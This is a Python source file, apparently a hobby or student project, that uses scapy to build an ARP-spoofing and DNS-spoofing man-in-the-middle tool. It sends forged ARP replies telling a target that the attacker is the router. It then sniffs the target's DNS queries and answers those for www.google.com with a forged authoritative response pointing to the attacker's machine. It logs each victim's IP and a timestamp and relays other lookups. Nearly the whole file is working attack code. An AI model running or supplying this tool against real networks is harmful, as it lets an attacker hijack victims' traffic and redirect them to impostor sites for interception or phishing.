from scapy.all import DNS, IP,sr1,send,sniff,srp, Packet# type:ignore
from scapy.all import conf
from scapy.layers.l2 import ARP,Ether
from scapy.layers.inet import UDP,IP #type :ignore
from scapy.layers.dns import DNS,DNSQR,DNSRR

from data.data_helper import record_entry

from random import randint
import json
import time


conf.noenum.add(conf.route.resync)
conf.use_pcap = True
conf.use_dnet = False #type:ignore
#disable DNS resolution
conf.netcache.resolve = False #type:ignore


class Spoofer:
    def __init__(self,host_ip,target_ip,router_ip) -> None:
        self.__ip = host_ip
        self.__target_ip = target_ip
        self.__router_ip = router_ip
        # Getting mac of the target
        # self.__target_mac = self.get_mac(self.__target_ip)
        self.__target_mac = "1e:00:da:26:fe:10 "

    def send_spoofed_packet(self): # Main
        """sending spoofed packet.
        """
        #print("Send spoofing packet")
        # generating the spoofed packet modifying the source and the target
        packet = ARP(op=2, # request
                        hwdst=self.__target_mac, # mac destination - target mac
                        pdst=self.__target_ip, # ip destination
                    psrc=self.__router_ip) # ip source
        # This packet is saying - I am the router.

        # sending the packet
        send(packet, verbose=False)



    def checkout(self):
        """stop spoofing.
        """
        pass

    def restore_defaults(self,dest, source):
        # getting the real MACs
        target_mac = self.get_mac(dest) # 1st (router), then (windows)
        source_mac = self.get_mac(source)
        # creating the packet
        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        # sending the packet
        send(packet, verbose=False)

    def get_mac(self,ip: str):
        """Get mac of the ip using ARP.

        Args:
            ip (str): ipv4 of the target.

        Returns:
            mac address of the target.
        """
        # request that contain the IP destination of the target
        # broadcast packet creation
        final_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        # getting the response
        answer = srp(final_packet, timeout=2, verbose=False)[0]
        # getting the MAC (its src because its a response)
        mac = answer[0][1].hwsrc
        return mac


    def process_packet(self,packet):
        """
        This function will identify when a request is a DNS request, and handle it. If the requested address is
        in the urls list, than send IP of the real url. Otherwise, return the real url.

        When sniffing a dns packet from target:
        Extract domain name -> If is in url dict, replace for actual domain name -> Send dns query to dns server -> receive dns response -> Modify ip src and dst -> Send dns response to target.
        """
        # Check if packet is a DNS query
        #print("Found packets")
        if packet.haslayer(DNSQR) and packet[DNS].qr == 0:


            #print("Found dns packets")
            domain = packet[DNSQR].qname.decode().rstrip(".")
            if 'info' in domain:
                pass
            if domain == "www.google.com":
                print(f"Intercepted DNS query for {domain}")

                # Craft spoofed DNS response
                response_packet = (
                    IP(dst=packet[IP].src, src=packet[IP].dst) /
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                    DNS(
                        id=packet[DNS].id,  # Match query ID
                        qr=1,            # Response flag
                        aa=1,            # Authoritative answer
                        qd=packet[DNS].qd,  # Copy query section
                        #ra=1,
                        an=DNSRR(rrname=domain, type="A", ttl=300, rdata=self.__ip)
                    )
                )

                # Send spoofed response
                send(response_packet, verbose=0)
                record_entry(domain,self.build_dict_from_packet(packet))
                print(f"Spoofed DNS response sent: {domain} -> {self.__ip}")
            else:
                response_packet = self.nslookup(domain)
                response_packet[IP].src,response_packet[IP].dst = packet[IP].dst,packet[IP].src
                # Modify the response packet, so it will match target's original query.
                send(response_packet,verbose=0) #type:ignore

    def forward_to_router(self):
        """
        Performs MITM.
        When the spoofing starts taking effect, all of the target computer's traffic will reach this machine.
        Using scapy to sniff all of the packets from target to router, and calling process_packet to handle them.
        """
        while True:
            sniff(filter="udp port 53",prn=self.process_packet,promisc=True,store=0,timeout=4)
            self.urls = self.get_urls()
        # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
        # Dump all corresponding packets into process_packet to handle.




    def build_dict_from_packet(self,packet) -> dict:
        d: dict = {}
        d["Time"] = str(time.time())
        d["IP"] = packet[IP].src
        #d["MAC address"] = self.get_mac(d["IP"])
        return d


    def get_urls(self) -> dict[str,str]:
        """
        return url dict, from urls.json
        """
        try:
            with open('urls.json', "r") as f:
                urls: dict[str, str] = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            urls = {}
        return urls


    def nslookup(self,domain) -> Packet:
        dns_query = IP(dst="8.8.8.8") / UDP(dport=53,sport=randint(20000,40000)) / DNS(qdcount=1, rd=1,qd = 0)/DNSQR(qname=domain)
        response_packet = sr1(dns_query,verbose=0)
        return response_packet #type:ignore

        #### Maybe for future use.
        dnsrr_list = response_packet.an


        # Check if the response contain Canonical name
        if dnsrr_list[0].type == 5:
            print("Name:   ", dnsrr_list[0].rdata.decode())
            print("Address:  ", end="")
            # Print all dnsrrs
            for dnsrr in dnsrr_list[1:]:
                print(dnsrr.rdata)
            print("Aliases: ", domain)
        else:  # if does not contain Canonical name
            print("Name:   ", domain)
            print("Address:  ", end="")
            # Print all dnsrrs
            for dnsrr in dnsrr_list:
                if (dnsrr != None):
                    print(dnsrr.rdata)
